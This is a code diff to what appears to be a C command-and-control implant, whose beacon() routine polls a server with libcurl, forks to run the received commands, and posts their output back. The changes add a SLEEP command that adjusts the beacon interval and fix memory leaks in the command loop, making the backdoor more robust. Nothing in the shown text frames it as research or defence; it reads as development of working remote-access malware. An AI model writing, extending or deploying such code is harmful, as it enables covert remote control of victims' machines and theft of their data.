@@ -19,6 +19,7 @@
 #include <curl/curl.h>
 #include "../include/attacks.h"
 #include "../include/utils.h"
+#include "options.h"
 
 #define FULL_URL_SIZE 1024
 
@@ -146,6 +147,17 @@ static char **parse_command(char *cmd) {
     free(copy);
     argv[count] = NULL;
     return argv;
+}
+
+static void free_parsed_command(char **argv) {
+    if(!argv) return;
+
+    int i = 0;
+    for(char *str = argv[i]; str; str = argv[++i]) {
+        free(str);
+    }
+    free(argv);
+    return;
 }
 #endif
 
@@ -406,17 +418,34 @@ void beacon(void) {
         char *envp[] = { NULL };
 
         if(strcmp(argv[0], "exit") == 0) {
+            free(command.response);
+            memset(&command, 0, sizeof(command));
+            free_parsed_command(argv);
             break;
+        } 
+
+        if(strcmp(argv[0], "SLEEP") == 0) {
+            delay = atoi(argv[1]);
+            free(command.response);
+            memset(&command, 0, sizeof(command));
+            free_parsed_command(argv);
+            continue;
         }
 
         if(pipe(parent_child) == -1 || pipe(child_parent) == -1) {
             LOG("pipe() failed\n");
+            free(command.response);
+            memset(&command, 0, sizeof(command));
+            free_parsed_command(argv);
             return;
         }
 
         switch(i = fork()) {
             case -1:
                 LOG("fork() failed in beacon()\n");
+                free(command.response);
+                memset(&command, 0, sizeof(command));
+                free_parsed_command(argv);
                 return;
             case 0:
                 dup2(parent_child[0], STDIN_FILENO);
@@ -446,6 +475,7 @@ void beacon(void) {
         post_data(curl, command_output, total_bytes, full_post_url);
 
         cleanup:
+        free_parsed_command(argv);
         free(command_output);
         close(parent_child[1]);
         close(child_parent[0]);
